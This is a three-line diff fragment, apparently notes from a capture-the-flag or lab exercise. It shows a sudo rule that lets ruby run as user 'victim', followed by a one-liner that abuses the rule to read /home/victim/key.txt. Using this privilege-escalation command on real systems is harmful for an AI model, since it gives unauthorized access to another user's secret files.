@@ -1,0 +1,3 @@
+  (victim) /usr/bin/ruby
+
+sudo -u victim ruby -e 'puts `cat /home/victim/key.txt`'
